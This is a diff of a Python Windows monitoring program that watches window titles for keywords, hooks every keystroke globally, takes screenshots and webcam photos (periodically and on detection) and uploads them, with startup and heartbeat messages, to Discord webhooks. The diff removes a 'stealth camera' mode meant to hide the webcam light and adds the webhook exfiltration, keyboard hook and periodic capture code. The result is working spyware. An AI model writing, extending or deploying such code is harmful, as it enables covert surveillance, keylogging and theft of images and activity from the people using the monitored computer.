@@ -8,11 +8,8 @@ import io
 from datetime import datetime
 from PIL import ImageGrab, Image
 import json
-import cv2
-import numpy as np
-import os
-import subprocess
-import sys
+import cv2  # Added for camera access
+import numpy as np  # Added for image processing
 
 # ---------------- CONFIG ---------------- #
 TARGET_KEYWORDS = [
@@ -117,12 +114,6 @@ SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (secon
 PERIODIC_SCREENSHOT_INTERVAL = 300  # Take screenshot every 5 seconds (even without detection)
 HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
 
-# Stealth camera settings
-CAMERA_STEALTH = True  # Set to True to prevent camera flash/light
-CAMERA_RESOLUTION = (640, 480)  # Lower resolution = less noticeable
-CAMERA_FPS = 15  # Lower FPS = less processing
-DISABLE_CAMERA_INDICATOR = True  # Try to disable camera indicator light (if possible)
-
 # ---------------- GLOBALS ---------------- #
 lock = threading.Lock() # Thread safety
 tracking_enabled = True  # Master toggle for tracking
@@ -132,8 +123,6 @@ last_heartbeat_time = time.time()  # Track when last heartbeat was sent
 last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
 program_start_time = time.time()  # Track program start time
 camera_device_index = 0  # Default camera index
-camera_cap = None  # Keep camera open to prevent flash
-camera_warmup_done = False  # Track if camera is warmed up
 
 # Track focus state to prevent spam
 current_focused_hwnd = None  # Current window handle
@@ -163,144 +152,29 @@ def take_screenshot():
         print(f"[SCREENSHOT ERROR] {e}")
         return None
 
-def stealth_camera_init():
-    """Initialize camera in stealth mode to prevent flash"""
-    global camera_cap, camera_device_index, camera_warmup_done
+def detect_and_initialize_camera():
+    """Try to detect and initialize available camera"""
+    global camera_device_index
     
-    if camera_cap is not None:
-        return True
-    
-    # Try different camera backends for stealth
-    backends = [
-        cv2.CAP_DSHOW,  # DirectShow (Windows)
-        cv2.CAP_MSMF,   # Microsoft Media Foundation
-        cv2.CAP_V4L2,   # Video for Linux
-        cv2.CAP_ANY     # Auto-detect
-    ]
-    
-    for backend in backends:
+    # Try to find camera by checking available devices
+    for i in range(3):  # Check first 3 indices
         try:
-            print(f"[CAMERA] Trying backend: {backend}")
-            cap = cv2.VideoCapture(camera_device_index, backend)
-            
+            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)  # CAP_DSHOW for Windows
             if cap.isOpened():
-                # Set low resolution and FPS for stealth
-                cap.set(cv2.CAP_PROP_FRAME_WIDTH, CAMERA_RESOLUTION[0])
-                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, CAMERA_RESOLUTION[1])
-                cap.set(cv2.CAP_PROP_FPS, CAMERA_FPS)
-                
-                # Try to disable auto-exposure and other auto settings
-                try:
-                    cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0.25)  # Manual exposure
-                    cap.set(cv2.CAP_PROP_EXPOSURE, -5)  # Lower exposure
-                except:
-                    pass
-                
-                # Read a few frames to warm up camera without flash
-                for _ in range(5):
-                    ret, _ = cap.read()
-                    if ret:
-                        time.sleep(0.05)
-                
-                camera_cap = cap
-                print(f"[CAMERA] Stealth initialization successful with backend: {backend}")
-                
-                # Warm up camera in background
-                threading.Thread(target=camera_warmup, daemon=True).start()
-                
-                return True
-                
-        except Exception as e:
-            print(f"[CAMERA] Backend {backend} failed: {e}")
-            if 'cap' in locals():
+                ret, frame = cap.read()
                 cap.release()
+                if ret and frame is not None:
+                    camera_device_index = i
+                    print(f"[CAMERA] Found camera at index {i}")
+                    return True
+        except:
+            continue
     
-    print("[CAMERA] Stealth initialization failed")
+    print("[CAMERA] No camera found, camera features disabled")
     return False
 
-def camera_warmup():
-    """Warm up camera in background to prevent flash when capturing"""
-    global camera_cap, camera_warmup_done
-    
-    if camera_cap is None:
-        return
-    
-    try:
-        print("[CAMERA] Warming up camera...")
-        # Read frames continuously for 2 seconds to keep camera active
-        warmup_end = time.time() + 2
-        while time.time() < warmup_end and camera_cap is not None:
-            ret, _ = camera_cap.read()
-            if not ret:
-                break
-            time.sleep(0.1)
-        
-        camera_warmup_done = True
-        print("[CAMERA] Camera warmup complete")
-        
-    except Exception as e:
-        print(f"[CAMERA WARMUP ERROR] {e}")
-
 def take_camera_picture():
-    """Take a picture from the camera without flash"""
-    global camera_cap, camera_warmup_done
-    
-    if not CAMERA_STEALTH:
-        # Use original method if stealth is disabled
-        return take_camera_picture_original()
-    
-    try:
-        # Initialize camera if not already done
-        if camera_cap is None:
-            if not stealth_camera_init():
-                return None
-            
-            # Wait for warmup if not done
-            if not camera_warmup_done:
-                print("[CAMERA] Waiting for warmup...")
-                for _ in range(20):  # 2 second timeout
-                    if camera_warmup_done:
-                        break
-                    time.sleep(0.1)
-        
-        if camera_cap is None or not camera_cap.isOpened():
-            print("[CAMERA] Camera not available")
-            return None
-        
-        # Read multiple frames and take the last one (most stable)
-        frames = []
-        for i in range(3):
-            ret, frame = camera_cap.read()
-            if ret and frame is not None:
-                frames.append(frame)
-            time.sleep(0.05)  # Small delay between frames
-        
-        if not frames:
-            print("[CAMERA] No frames captured")
-            return None
-        
-        # Use the last frame (most recent)
-        frame = frames[-1]
-        
-        # Convert BGR to RGB
-        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        
-        # Apply slight blur to reduce noise (makes it less obvious)
-        if CAMERA_STEALTH:
-            frame_rgb = cv2.GaussianBlur(frame_rgb, (3, 3), 0)
-        
-        # Convert to PIL Image
-        camera_image = Image.fromarray(frame_rgb)
-        
-        return camera_image
-        
-    except Exception as e:
-        print(f"[CAMERA STEALTH ERROR] {e}")
-        # Fall back to original method
-        return take_camera_picture_original()
-
-def take_camera_picture_original():
-    """Original camera capture method (non-stealth)"""
+    """Take a picture from the camera"""
     try:
         cap = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
         if not cap.isOpened():
@@ -326,69 +200,124 @@ def take_camera_picture_original():
         return camera_image
         
     except Exception as e:
-        print(f"[CAMERA ORIGINAL ERROR] {e}")
+        print(f"[CAMERA ERROR] {e}")
         return None
 
-def detect_and_initialize_camera():
-    """Try to detect and initialize available camera"""
-    global camera_device_index
-    
-    print("[CAMERA] Detecting available cameras...")
-    
-    # Try to find camera by checking available devices
-    available_cameras = []
-    for i in range(5):  # Check first 5 indices
-        try:
-            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
-            if cap.isOpened():
-                ret, frame = cap.read()
-                cap.release()
-                if ret and frame is not None:
-                    available_cameras.append(i)
-                    print(f"[CAMERA] Found camera at index {i}")
-        except:
-            continue
-    
-    if available_cameras:
-        camera_device_index = available_cameras[0]
-        print(f"[CAMERA] Using camera index {camera_device_index}")
+def send_to_webhook(webhook_url, payload, screenshot_bytes=None, camera_bytes=None):
+    """Send data to a specific webhook URL"""
+    try:
+        files = {}
         
-        if CAMERA_STEALTH:
-            print("[CAMERA] Stealth mode enabled - initializing...")
-            return stealth_camera_init()
-        return True
-    else:
-        print("[CAMERA] No camera found, camera features disabled")
+        if screenshot_bytes:
+            screenshot_io = io.BytesIO(screenshot_bytes)
+            files['file'] = ('screenshot.png', screenshot_io, 'image/png')
+        
+        if camera_bytes:
+            camera_io = io.BytesIO(camera_bytes)
+            files['file2'] = ('camera.png', camera_io, 'image/png')
+        
+        if files:
+            # Prepare multipart form data
+            if 'embeds' in payload:
+                data = {'payload_json': json.dumps(payload)}
+                response = requests.post(
+                    webhook_url,
+                    files=files,
+                    data=data,
+                    timeout=10
+                )
+            else:
+                # If no embeds, just send with files
+                response = requests.post(
+                    webhook_url,
+                    files=files,
+                    data=payload,
+                    timeout=10
+                )
+        else:
+            headers = {'Content-Type': 'application/json'}
+            response = requests.post(
+                webhook_url,
+                json=payload,
+                headers=headers,
+                timeout=10
+            )
+        
+        if response.status_code in [200, 204]:
+            print(f"[WEBHOOK SUCCESS] Sent to {webhook_url[:40]}...")
+            return True
+        else:
+            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:40]}...: {response.status_code} - {response.text}")
+            return False
+            
+    except Exception as e:
+        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:40]}...")
         return False
 
-def cleanup_camera():
-    """Clean up camera resources"""
-    global camera_cap
-    if camera_cap is not None:
-        try:
-            camera_cap.release()
-            camera_cap = None
-            print("[CAMERA] Camera released")
-        except:
-            pass
-
-# ... (rest of the functions remain the same: send_to_webhook, send_to_all_webhooks, send_discord_alert, etc.) ...
+def send_to_all_webhooks(payload, screenshot=None, camera_image=None):
+    """Send message to all configured webhooks"""
+    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
+        print("[DISCORD] No webhooks configured")
+        return False
+    
+    success_count = 0
+    threads = []
+    
+    # Convert images to bytes once
+    screenshot_bytes = None
+    camera_bytes = None
+    
+    if screenshot and SEND_SCREENSHOTS:
+        img_byte_arr = io.BytesIO()
+        screenshot.save(img_byte_arr, format='PNG')
+        screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
+    
+    if camera_image:
+        img_byte_arr = io.BytesIO()
+        camera_image.save(img_byte_arr, format='PNG')
+        camera_bytes = img_byte_arr.getvalue()  # Get raw bytes
+    
+    # Add image info to payload
+    if 'embeds' in payload:
+        if screenshot_bytes and camera_bytes:
+            payload['content'] = "📸 **Screenshot and Camera picture captured below:**"
+        elif screenshot_bytes:
+            payload['content'] = "📸 **Screenshot captured below:**"
+        elif camera_bytes:
+            payload['content'] = "📷 **Camera picture captured below:**"
+    
+    for webhook_url in DISCORD_WEBHOOKS:
+        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
+            continue
+            
+        # Create thread for each webhook
+        thread = threading.Thread(
+            target=send_to_webhook,
+            args=(webhook_url, payload),
+            kwargs={'screenshot_bytes': screenshot_bytes, 'camera_bytes': camera_bytes}
+        )
+        
+        thread.start()
+        threads.append(thread)
+    
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join(timeout=15)  # 15 second timeout per webhook
+        
+        # Check if thread completed successfully
+        if not thread.is_alive():
+            success_count += 1
+    
+    print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
+    return success_count > 0
 
 def send_discord_alert(title, keyword, screenshot=None, camera_image=None):
     """Send alert to Discord webhooks with optional screenshot and camera image"""
     # Prepare the message
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Add stealth indicator if camera was used
-    camera_info = ""
-    if camera_image and CAMERA_STEALTH:
-        camera_info = "\n**Camera:** Stealth mode (no flash)"
-    elif camera_image:
-        camera_info = "\n**Camera:** Standard mode"
-    
     embed = {
         "title": "⚠️ Target Application Detected",
-        "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`{camera_info}",
+        "description": f"**Window Title:** `{title}`\n**Matched Keyword:** `{keyword}`\n**Time:** `{current_time}`",
         "color": 16711680,  # Red color
         "footer": {
             "text": "Tracker System"
@@ -402,10 +331,138 @@ def send_discord_alert(title, keyword, screenshot=None, camera_image=None):
     
     return send_to_all_webhooks(payload, screenshot, camera_image)
 
+def send_discord_status(status):
+    """Send tracking status to Discord"""
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        color = 65280 if status == "ENABLED" else 16711680  # Green for enabled, red for disabled
+        
+        embed = {
+            "title": f"🔄 Tracking {status}",
+            "description": f"Tracking has been **{status.lower()}**\n**Time:** `{current_time}`",
+            "color": color,
+            "footer": {
+                "text": "Tracker System"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed],
+            "content": f"📊 **Tracker Status Changed**"
+        }
+        
+        return send_to_all_webhooks(payload)
+        
+    except Exception as e:
+        print(f"[DISCORD STATUS ERROR] {e}")
+        return False
+
+def send_heartbeat():
+    """Send heartbeat webhook to confirm PC is active"""
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        uptime_seconds = int(time.time() - program_start_time)
+        
+        # Convert uptime to readable format
+        hours = uptime_seconds // 3600
+        minutes = (uptime_seconds % 3600) // 60
+        seconds = uptime_seconds % 60
+        
+        embed = {
+            "title": "💓 PC Heartbeat",
+            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**Tracking Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`",
+            "color": 3447003,  # Blue color
+            "footer": {
+                "text": "Tracker System"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed]
+        }
+        
+        success = send_to_all_webhooks(payload)
+        if success:
+            print(f"[HEARTBEAT] Sent to all webhooks at {current_time}")
+        return success
+            
+    except Exception as e:
+        print(f"[HEARTBEAT ERROR] {e}")
+        return False
+
+def send_periodic_screenshot():
+    """Send periodic screenshot to Discord (every 5 seconds)"""
+    try:
+        # Get current window info even if not a target
+        hwnd = win32gui.GetForegroundWindow()
+        title = win32gui.GetWindowText(hwnd).strip()
+        
+        if not title:
+            title = "No window title"
+        
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Take screenshot
+        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
+        
+        # Take camera picture
+        camera_image = take_camera_picture()
+        
+        # Prepare message
+        embed = {
+            "title": "⏰ Periodic Capture",
+            "description": f"**Window Title:** `{title}`\n**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`",
+            "color": 10181046,  # Purple color
+            "footer": {
+                "text": "Tracker System - Periodic Capture"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed],
+            "content": f"📸 **Periodic capture (Screen + Camera)**"
+        }
+        
+        success = send_to_all_webhooks(payload, screenshot, camera_image)
+        if success:
+            print(f"[PERIODIC] Sent periodic capture at {current_time} (Window: '{title[:50]}...')")
+        return success
+            
+    except Exception as e:
+        print(f"[PERIODIC ERROR] {e}")
+        return False
+
+def send_startup_message():
+    """Send webhook when the program starts"""
+    try:
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        embed = {
+            "title": "🚀 Tracker Started",
+            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Captures:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)`",
+            "color": 3066993,  # Green color
+            "footer": {
+                "text": "Tracker System"
+            }
+        }
+        
+        payload = {
+            "embeds": [embed],
+            "content": "📱 **System Online** - Tracker is now active"
+        }
+        
+        success = send_to_all_webhooks(payload)
+        if success:
+            print(f"[STARTUP] Message sent to all webhooks at {current_time}")
+        return success
+            
+    except Exception as e:
+        print(f"[STARTUP ERROR] {e}")
+        return False
+
 def toggle_tracking():
     """Toggle tracking on/off"""
     global tracking_enabled, password_buffer, recently_alerted_windows
-    
     tracking_enabled = not tracking_enabled
     status = "ENABLED" if tracking_enabled else "DISABLED"
     print(f"[TRACKING] Tracking {status}")
@@ -413,20 +470,103 @@ def toggle_tracking():
     # Clear recently alerted windows when toggling
     recently_alerted_windows.clear()
     
-    # If disabling tracking, clean up camera
-    if not tracking_enabled:
-        cleanup_camera()
-    # If enabling tracking and stealth mode is on, pre-warm camera
-    elif tracking_enabled and CAMERA_STEALTH:
-        threading.Thread(target=stealth_camera_init, daemon=True).start()
-    
     # Send Discord notification about status change
     threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
     
     password_buffer = ""  # Clear password buffer
 
-# ... (rest of the keyboard event handlers and monitoring functions remain the same) ...
+def on_key_event(e):
+    """Handle keyboard events for password detection"""
+    global password_buffer, last_key_time
+    
+    # Ignore modifier keys and non-character keys
+    if len(e.name) > 1 and e.name not in ['space', 'enter', 'backspace']:
+        return
+    
+    current_time = time.time()
+    
+    # Clear buffer if too much time passed between keystrokes (2 seconds)
+    if current_time - last_key_time > 2:
+        password_buffer = ""
+    
+    last_key_time = current_time
+    
+    # Handle backspace
+    if e.event_type == keyboard.KEY_DOWN:
+        if e.name == 'backspace':
+            password_buffer = password_buffer[:-1]
+        elif e.name == 'space':
+            password_buffer += ' '
+        elif len(e.name) == 1:  # Regular character
+            password_buffer += e.name
+        elif e.name == 'enter':  # Enter key submits password
+            check_password()
+            return
+    
+    # Check password continuously (without needing Enter)
+    check_password()
+    
+    # Keep buffer from growing too large
+    if len(password_buffer) > 20:
+        password_buffer = password_buffer[-20:]
 
+def check_password():
+    """Check if password buffer contains the password"""
+    global password_buffer
+    if PASSWORD in password_buffer:
+        toggle_tracking()
+        password_buffer = ""  # Clear after successful match
+
+def setup_keyboard_listener():
+    """Setup global keyboard listeners"""
+    # Hotkey to toggle tracking
+    keyboard.add_hotkey(TOGGLE_HOTKEY, toggle_tracking, suppress=False)
+    print(f"[HOTKEY] Press '{TOGGLE_HOTKEY}' to toggle tracking")
+    print(f"[PASSWORD] Type '{PASSWORD}' to toggle tracking")
+    
+    # General key listener for password typing
+    keyboard.hook(on_key_event, suppress=False)
+    
+    return keyboard
+
+def should_send_alert(hwnd, title, keyword):
+    """Check if we should send an alert for this window"""
+    global current_focused_hwnd, current_focused_title, last_alert_time, recently_alerted_windows
+    
+    current_time = time.time()
+    
+    # Clean up old entries from recently_alerted_windows
+    to_remove = []
+    for window_hwnd, (window_title, alert_time) in list(recently_alerted_windows.items()):
+        if current_time - alert_time > alert_cooldown * 2:  # Clean up after 2x cooldown
+            to_remove.append(window_hwnd)
+    
+    for hwnd_key in to_remove:
+        del recently_alerted_windows[hwnd_key]
+    
+    # Check if this is a new focus or different window
+    if hwnd == current_focused_hwnd and title == current_focused_title:
+        # Same window still focused, check cooldown
+        if current_time - last_alert_time < alert_cooldown:
+            return False  # Still in cooldown period
+        
+        # Check if we've already alerted for this window recently
+        if hwnd in recently_alerted_windows:
+            window_title, last_alert = recently_alerted_windows[hwnd]
+            if current_time - last_alert < alert_cooldown:
+                return False  # Already alerted for this window recently
+    
+    # Update focus tracking
+    current_focused_hwnd = hwnd
+    current_focused_title = title
+    
+    # Record this alert
+    recently_alerted_windows[hwnd] = (title, current_time)
+    last_alert_time = current_time
+    
+    return True
+
+# ---------------- HEARTBEAT THREAD ---------------- #
 def heartbeat_monitor():
     """Periodically send heartbeat every 5 minutes"""
     global last_heartbeat_time
@@ -440,10 +580,6 @@ def heartbeat_monitor():
                 threading.Thread(target=send_heartbeat, daemon=True).start()
                 last_heartbeat_time = current_time
             
-            # Clean up camera if not tracking
-            if not tracking_enabled and camera_cap is not None:
-                cleanup_camera()
-            
             # Sleep for 1 minute and check again
             time.sleep(60)
             
@@ -451,6 +587,7 @@ def heartbeat_monitor():
             print(f"[HEARTBEAT MONITOR ERROR] {e}")
             time.sleep(60)
 
+# ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
 def periodic_screenshot_monitor():
     """Periodically take screenshots every 5 seconds"""
     global last_periodic_screenshot_time
@@ -479,7 +616,6 @@ print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
 print(f"[SYSTEM] Alert cooldown: {alert_cooldown} seconds per window")
 print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)")
-print(f"[CAMERA] Stealth mode: {'ENABLED' if CAMERA_STEALTH else 'DISABLED'}")
 
 # Initialize camera
 print("[CAMERA] Initializing camera...")
@@ -489,7 +625,44 @@ if camera_available:
 else:
     print("[CAMERA] Camera not available, only screenshots will be sent")
 
-# ... (rest of the initialization code remains the same) ...
+# Send startup webhook immediately
+if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
+    print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
+    threading.Thread(target=send_startup_message, daemon=True).start()
+    
+    # Start heartbeat monitor in a separate thread
+    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
+    heartbeat_thread.start()
+    print(f"[HEARTBEAT] Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
+    
+    # Start periodic screenshot monitor in a separate thread
+    periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
+    periodic_thread.start()
+    print(f"[PERIODIC] Periodic capture monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
+else:
+    print("[DISCORD] No webhooks configured - skipping startup and heartbeat messages")
+
+# Test Discord connections
+valid_webhooks = []
+for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
+    if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
+        print(f"[DISCORD] Webhook {i} configured")
+        try:
+            # Just check if URL looks valid, don't actually send GET request
+            if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
+                print(f"[DISCORD] Webhook {i} URL format is valid")
+                valid_webhooks.append(webhook_url)
+            else:
+                print(f"[DISCORD WARNING] Webhook {i} has unusual format")
+                valid_webhooks.append(webhook_url)
+        except:
+            print(f"[DISCORD] Could not test webhook {i} (will still try to post)")
+            valid_webhooks.append(webhook_url)
+
+if valid_webhooks:
+    print(f"[DISCORD] {len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid - Screenshots: {SEND_SCREENSHOTS}")
+else:
+    print("[DISCORD] No valid webhooks configured - skipping Discord alerts")
 
 # Setup keyboard listener
 kb_listener = setup_keyboard_listener()
@@ -522,10 +695,8 @@ try:
                         # Take screenshot in main thread
                         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                         
-                        # Take camera picture (stealth mode if enabled)
-                        camera_image = None
-                        if camera_available:
-                            camera_image = take_camera_picture()
+                        # Take camera picture
+                        camera_image = take_camera_picture()
                         
                         # Send alert to both webhooks
                         alert_thread = threading.Thread(
@@ -555,6 +726,4 @@ except KeyboardInterrupt:
 finally:
     # Cleanup
     keyboard.unhook_all()
-    cleanup_camera()
     print("[SYSTEM] Keyboard listeners stopped")
-    print("[SYSTEM] Camera resources released")
